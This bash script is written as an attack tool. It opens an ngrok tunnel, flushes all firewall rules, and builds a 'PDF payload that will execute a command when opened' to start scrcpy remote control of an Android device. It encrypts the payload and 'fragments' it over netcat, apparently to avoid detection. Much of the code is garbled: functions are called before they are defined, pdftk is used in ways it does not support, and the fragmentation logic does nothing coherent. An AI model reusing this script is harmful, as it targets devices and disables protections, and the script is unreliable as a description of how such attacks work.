#!/bin/bash

# Check if ngrok is installed
if ! command -v ngrok &> /dev/null; then
  echo "ngrok is not installed. Please install ngrok before running this script."
  exit 1
fi

# Check if an Android device is connected
if ! adb devices | grep -q device; then
  echo "No Android device is connected. Please connect an Android device before running this script."
  exit 1
fi

# Get the path to the iptables command
IPTABLES=$(which iptables)

# Flush all existing firewall rules
$IPTABLES -F

# Allow all incoming connections to port 8080
$IPTABLES -A INPUT -p tcp --dport 8080 -j ACCEPT

# Allow all outgoing connections from the script
$IPTABLES -A OUTPUT -m owner --uid-owner "$(id -u)" -j ACCEPT

# Create a ngrok tunnel
ngrok tcp 8080

# Get the ngrok tunnel URL
tunnel_url="$(ngrok status | grep "Forwarding" | awk '{print $6}')"

# Generate a PDF payload that will execute a command when opened
pdf_payload="$(generate_pdf_payload)"

# Encrypt the PDF payload using openssl
encrypted_pdf_payload="$(openssl aes-256-cbc -e -k "YOUR_SECRET_KEY" -in "$pdf_payload" -out "$pdf_payload.enc")"

# Fragment the PDF payload
fragmented_pdf_payload="$(fragment_packets "$pdf_payload.enc")"

# Start the VPN
# Replace the following line with the command to start your VPN client
# openvpn "YOUR_VPN_CONFIG_FILE"

# Create a text file that contains the scrcpy command
command_file="/tmp/command.txt"

# Write the scrcpy command to the text file
echo "scrcpy -d $(get_device_id) --background --auto-connect yes" > $command_file

# Convert the text file to a PDF file
pdftk $command_file output "$fragmented_pdf_payload"

# Open the PDF file automatically in the background
xdg-open $fragmented_pdf_payload &

# Print the ngrok tunnel URL
echo "Your ngrok tunnel is $tunnel_url"

# Get the device ID of the first Android device that is connected to the computer
function get_device_id() {
  adb devices | grep device | head -n 1 | awk '{print $1}'
}

# Generate a PDF payload that will execute a command when opened
function generate_pdf_payload() {
  # Generate PDF payload using pdftk
  pdftk "" output "$pdf_payload"

  # Add the scrcpy command to the PDF payload
  pdftk "$pdf_payload" insert "scrcpy -d $(get_device_id) --background --auto-connect yes" output "$pdf_payload"
}

# Fragment the PDF payload into small chunks
function fragment_packets() {
  # Get the PDF payload
  pdf_payload="$1"

  # Create a temporary file to store the fragmented PDF payload
  fragmented_pdf_payload="/tmp/fragmented_pdf_payload"

  # Send the PDF payload to a local port in small chunks
  nc -u localhost 8080 < "$pdf_payload"

  # Listen for the fragmented PDF payload on the local port and write it to the temporary file
  nc -l -u 8080 > "$fragmented_pdf_payload"

  # Return the temporary file containing the fragmented PDF payload
  echo "$fragmented_pdf_payload"
}

# Trap SIGINT and SIGTERM signals to clean up temporary files
trap cleanup SIGINT SIGTERM

# Cleanup temporary files
function cleanup() {
  rm -f "$pdf_payload"
  rm -f "$fragmented_pdf_payload"
}
